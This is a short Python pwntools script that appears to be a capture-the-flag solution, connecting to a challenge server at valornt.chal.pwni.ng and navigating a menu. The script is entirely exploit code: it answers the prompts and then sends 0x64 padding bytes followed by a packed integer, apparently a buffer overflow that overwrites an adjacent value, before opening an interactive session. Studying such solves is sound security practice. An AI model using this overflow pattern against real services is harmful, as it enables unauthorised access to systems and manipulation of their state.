from pwn import *

io = remote('valornt.chal.pwni.ng', 1337)


print(io.recv())
io.sendline(b'3')
print(io.recv())
io.sendline(b'y')
print(io.recv())
io.sendline(b'cheater ok?')
io.sendline(b'y')
io.sendline(b'x'*0x64+p32(1))

io.interactive()
